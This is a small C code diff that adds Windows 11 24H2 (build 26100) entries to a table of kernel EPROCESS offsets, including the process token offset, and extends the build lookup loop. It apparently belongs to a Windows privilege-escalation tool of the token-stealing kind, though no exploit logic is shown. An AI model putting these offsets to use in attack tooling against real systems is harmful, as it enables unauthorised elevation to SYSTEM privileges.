@@ -2,7 +2,8 @@
 #include <stdio.h>
 
 
-DWORD eprocessOffsets[4][4] = {
+DWORD eprocessOffsets[5][4] = {
+    {26100, 0x1d0, 0x1d8, 0x248}, // Change from 24H2
     {19041, 0x440, 0x448, 0x4b8}, // Change from 20H1
     {18362, 0x2e8, 0x2f0, 0x360}, // Change from 19H1
     {15063, 0x2e0, 0x2e8, 0x358}, // Offsets change starting from 1703
@@ -23,7 +24,7 @@ BOOL GetSystemBuild(DWORD* CurrentBuild) {
     return TRUE;
 }
 
-int ObtainOffsets(DWORD *offsets) {
+int ObtainOffsets(DWORD* offsets) {
     DWORD ubr;
     DWORD CurrentBuild;
     DWORD TokenOffset;
@@ -35,7 +36,7 @@ int ObtainOffsets(DWORD *offsets) {
     printf("[*] CurrentBuild: %i\n", CurrentBuild);
 
     // Get offset from table
-    for (int i = 0; i < 4; i++) {
+    for (int i = 0; i < 5; i++) {
         if (eprocessOffsets[i][0] > CurrentBuild) {
             continue;
         }
